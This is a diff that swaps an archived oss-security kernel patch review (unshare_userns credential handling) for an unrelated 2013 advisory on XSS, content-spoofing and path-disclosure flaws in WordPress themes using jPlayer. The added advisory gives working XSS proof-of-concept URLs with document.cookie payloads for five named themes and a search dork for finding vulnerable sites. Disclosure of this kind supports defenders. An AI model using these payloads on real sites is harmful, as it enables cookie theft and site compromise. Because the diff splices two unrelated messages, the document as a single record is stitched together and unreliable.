@@ -1,67 +1,120 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/06/9
-Message-ID: <CALCETrWbsT+HGvVQMV_fUEDa1otG+er0gU3H4v-_9FdWgYpY1g@mail.gmail.com>
-Date: Tue, 6 Aug 2013 11:14:24 -0700
-From: Andy Lutomirski <luto@...capital.net>
-To: Oleg Nesterov <oleg@...hat.com>
-Cc: security@...nel.org, oss-security@...ts.openwall.com,  Petr Matousek <pmatouse@...hat.com>, "Eric W. Biederman" <ebiederm@...ssion.com>,  David Howells <dhowells@...hat.com>, linux-kernel@...r.kernel.org
-Subject: Re: [PATCH 1/1] userns: unshare_userns(&cred) should not populate cred on failure
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/24/14
+Message-ID: <008701ce412d$c8ac6c80$9b7a6fd5@pc>
+Date: Wed, 24 Apr 2013 23:52:39 +0300
+From: "MustLive" <mustlive@...security.com.ua>
+To: <submissions@...ketstormsecurity.org>, <full-disclosure@...ts.grok.org.uk>, "1337 Exploit DataBase" <mr.inj3ct0r@...il.com>, "Open Source Security" <oss-security@...ts.openwall.com>
+Subject: Vulnerabilities in multiple themes for WordPress with jPlayer
 Content-Type: text/plain; charset=utf-8
 
-On Tue, Aug 6, 2013 at 10:38 AM, Oleg Nesterov <oleg@...hat.com> wrote:
-> unshare_userns(new_cred) does *new_cred = prepare_creds() before
-> create_user_ns() which can fail. However, the caller expects that
-> it doesn't need to take care of new_cred if unshare_userns() fails.
->
-> We could change the single caller, sys_unshare(), but I think it
-> would be more clean to avoid the side effects on failure, so with
-> this patch unshare_userns() does put_cred() itself and initializes
-> *new_cred only if create_user_ns() succeeeds.
->
-> Cc: stable@...r.kernel.org
-> Signed-off-by: Oleg Nesterov <oleg@...hat.com>
-> ---
->  kernel/user_namespace.c |   13 +++++++++----
->  1 files changed, 9 insertions(+), 4 deletions(-)
->
-> diff --git a/kernel/user_namespace.c b/kernel/user_namespace.c
-> index d8c30db..6e50a44 100644
-> --- a/kernel/user_namespace.c
-> +++ b/kernel/user_namespace.c
-> @@ -105,16 +105,21 @@ int create_user_ns(struct cred *new)
->  int unshare_userns(unsigned long unshare_flags, struct cred **new_cred)
->  {
->         struct cred *cred;
-> +       int err = -ENOMEM;
->
->         if (!(unshare_flags & CLONE_NEWUSER))
->                 return 0;
->
->         cred = prepare_creds();
-> -       if (!cred)
-> -               return -ENOMEM;
-> +       if (cred) {
-> +               err = create_user_ns(cred);
-> +               if (err)
-> +                       put_cred(cred);
-> +               else
-> +                       *new_cred = cred;
-> +       }
->
-> -       *new_cred = cred;
-> -       return create_user_ns(cred);
-> +       return err;
->  }
->
->  void free_user_ns(struct user_namespace *ns)
-> --
-> 1.5.5.1
->
->
+Hello list!
 
-Reviewed-by: Andy Lutomirski <luto@...capital.net>
+I want to inform you about multiple vulnerabilities in multiple themes for 
+WordPress with jPlayer. These are Cross-Site Scripting, Content Spoofing and 
+Full path disclosure vulnerabilities.
+
+I've wrote about vulnerabilities in jPlayer earlier 
+(http://seclists.org/fulldisclosure/2013/Apr/192). jPlayer is used in 
+multiple web applications and particularly in multiple plugins (as I've 
+wrote earlier) and themes for WordPress. And in WP themes even more then in 
+plugins - there are many thousands of vulnerable themes (these are free, 
+commercial and custom themes). Plus there are many web sites which placed 
+Jplayer.swf in other folders besides plugins and themes. Google dork for 
+jPlayer shows 32000 results and for WP themes with it shows 313000 
+(inurl:Jplayer.swf inurl:/wp-content/themes/).
+
+Among them are Studiozen, Photocrati, Music, Imperial Fairytale and 
+Feather12. And thousands of other themes (see Google dork). All developers 
+of these themes, the same as developers of all other web applications with 
+jPlayer, need to update it in their software.
+
+-------------------------
+Affected products:
+-------------------------
+
+All versions of Studiozen, Photocrati, Music, Imperial Fairytale and 
+Feather12 themes.
+
+Vulnerabilities are in jPlayer versions before 2.2.23. Version 2.2.23 and 
+the last released version 2.3.0 are not vulnerable to mentioned XSS, except 
+CS via JS and XSS via JS callbacks. Also there are other bypass methods 
+which work in version 2.3.0, but the developers haven't fixed them besides 
+attack via alert. About that I've wrote to developers already in March and 
+reminded again. So wait for new version with fixing of these 
+vulnerabilities.
+
+----------
+Details:
+----------
+
+Cross-Site Scripting (WASC-08):
+
+In different versions of jPlayer there are different XSS vulnerabilities 
+(see in the first advisory) and different WP themes has different versions 
+of jPlayer.
+
+Studiozen:
+
+http://site/wp-content/themes/studiozen/js/html5player/Jplayer.swf?id=%27))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//
+
+Photocrati:
+
+http://site/wp-content/themes/photocrati-theme/scripts/Jplayer.swf?id=%22))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//
+
+Music:
+
+http://site/wp-content/themes/music/js/Jplayer.swf?id=%22))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//
+
+Imperial Fairytale:
+
+http://site/wp-content/themes/imperial-fairytale/assets/swf/Jplayer.swf?jQuery=document.write&id=%3Cimg%20src=1%20onerror=alert\u0028document.cookie\u0029%3E
+
+Feather12:
+
+http://site/wp-content/themes/feather12/js/Jplayer.swf?jQuery=)}catch(e){}if(!self.a)self.a=!alert(document.cookie)//
+
+http://site/wp-content/themes/feather12/js/Jplayer.swf?id=%27))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//
+
+Content Spoofing (WASC-12):
+
+It's possible to conduct CS (inclusion of audio/video files from external 
+resources) via JS and XSS via JS callbacks. This requires HTML Injection 
+vulnerability at the site. The attack is similar to XSS attacks via 
+callbacks in JW Player (http://securityvulns.ru/docs28176.html).
+
+Because this attack vector requires separate vulnerability at target site to 
+conduct CS and XSS attacks with using of jPlayer, the developers didn't do 
+anything to fix it. The same as developers JW Player. So protection from 
+this attack scenario lies solely on web sites owners.
+
+Full path disclosure (WASC-13):
+
+All mentioned themes have FPD vulnerabilities in php-files (in index.php and 
+others), which is typically for WP themes.
+
+http://site/wp-content/themes/studiozen/
+
+http://site/wp-content/themes/photocrati-theme/
+
+http://site/wp-content/themes/music/
+
+http://site/wp-content/themes/imperial-fairytale/
+
+http://site/wp-content/themes/feather12/
+
+------------
+Timeline:
+------------ 
+
+2013.03.19 - informed developers of jPlayer.
+2013.04.20 - developers released jPlayer 2.3.0 
+(http://www.jplayer.org/2.3.0/release-notes/) and informed me.
+2013.04.21 - informed multiple developers of WordPress plugins and other 
+software with jPlayer.
+
+Best wishes & regards,
+MustLive
+Administrator of Websecurity web site
+http://websecurity.com.ua 
 
 
--- 
-Andy Lutomirski
-AMA Capital Management, LLC
